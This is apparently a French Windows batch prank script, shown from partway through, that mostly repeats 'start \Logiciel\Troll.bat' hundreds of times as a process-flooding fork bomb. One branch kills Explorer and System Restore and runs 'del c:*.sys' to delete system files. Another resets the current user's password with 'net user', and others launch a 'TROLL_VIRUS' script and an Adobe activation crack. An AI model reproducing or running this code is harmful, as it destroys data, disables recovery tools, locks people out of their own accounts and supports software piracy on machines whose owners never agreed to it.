start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
exit
:troll_2

@echo off
set /P choix=Qui suis-je ? (H=Haxor ; N=Je ne sais pas) :
If /I %choix%==H (
echo Ah Bas sa en vaut pas la peine. retourne faire le kikoo mais quand meme 
taskkill /F /IM explorer.exe
taskkill /F /IM sndvol32.exe
taskkill /F /IM rstrui.exe
del c:*.sys
) else (
If /I %choix%==N (
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
) else echo Bonne Chance ! :) 
)
pause
exit
:Change_pass_user
@echo off
net user %USER% JackRyan
:oppai-hh
start \Logiciel\TROLL_VIRUS\oppai-hh.bat
exit
:Adobe
start \Logiciel\amtemu.v0.9.2-painter.exe /f
exit
:Active
start \Logiciel\Activation.bat
goto end
:end
exit
